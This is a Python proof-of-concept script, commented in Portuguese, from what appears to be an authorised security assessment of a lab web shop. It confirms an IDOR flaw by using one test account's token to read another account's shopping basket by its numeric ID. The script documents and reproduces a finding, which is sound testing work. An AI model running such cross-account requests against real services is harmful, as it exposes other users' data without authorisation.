"""Prova de conceito de IDOR (A01 Broken Access Control) na cesta de compras.

Complementa a evidência original (captura de tela do `fetch()` executado
no console do navegador, em `evidencias/`) com uma versão reproduzível
por linha de comando: registra duas contas de teste, adiciona um item à
cesta da primeira e usa o token válido da segunda para requisitar a
cesta da primeira diretamente pelo identificador numérico.
"""

from __future__ import annotations

import uuid

from scripts.lib import config
from scripts.lib.evidence import EvidenceRecorder
from scripts.lib.http_session import ScopedSession

ACHADO_ID = "V3"
SLUG = "idor-cesta"


def _registrar_e_logar(sessao: ScopedSession, senha: str) -> tuple[str, int]:
    email = f"idor-{uuid.uuid4().hex[:10]}@lab.local"
    sessao.post(
        f"{config.BASE_URL}/api/Users",
        json={
            "email": email,
            "password": senha,
            "passwordRepeat": senha,
            "securityQuestion": {"id": 1},
            "securityAnswer": "resposta-de-teste",
        },
    )
    resposta_login = sessao.post(
        f"{config.BASE_URL}/rest/user/login",
        json={"email": email, "password": senha},
    )
    dados = resposta_login.json()["authentication"]
    return dados["token"], dados["bid"]


def executar() -> None:
    """Executa a prova de conceito de ponta a ponta e imprime o veredito."""
    recorder = EvidenceRecorder(ACHADO_ID, SLUG)
    sessao = ScopedSession(recorder=recorder)

    token_a, cesta_a = _registrar_e_logar(sessao, "SenhaForte#1")
    token_b, cesta_b = _registrar_e_logar(sessao, "OutraSenha#2")

    sessao.post(
        f"{config.BASE_URL}/api/BasketItems/",
        json={"ProductId": 1, "BasketId": str(cesta_a), "quantity": 2},
        headers={"Authorization": f"Bearer {token_a}"},
    )

    resposta_idor = sessao.get(
        f"{config.BASE_URL}/rest/basket/{cesta_a}",
        headers={"Authorization": f"Bearer {token_b}"},
    )

    corpo = resposta_idor.json()
    dono_real = corpo.get("data", {}).get("UserId")
    print(f"Cesta da conta A: {cesta_a} | cesta da conta B: {cesta_b}")
    print(f"Requisição da conta B à cesta {cesta_a}: HTTP {resposta_idor.status_code}")
    print(f"UserId retornado no corpo: {dono_real}")
    if resposta_idor.status_code == 200 and dono_real is not None:
        print("RESULTADO: IDOR confirmado — conta B leu a cesta pertencente a outra conta.")
    else:
        print("RESULTADO: acesso negado — comportamento esperado, sem achado.")
    print(f"Evidência gravada em: {recorder.directory}")


if __name__ == "__main__":
    executar()
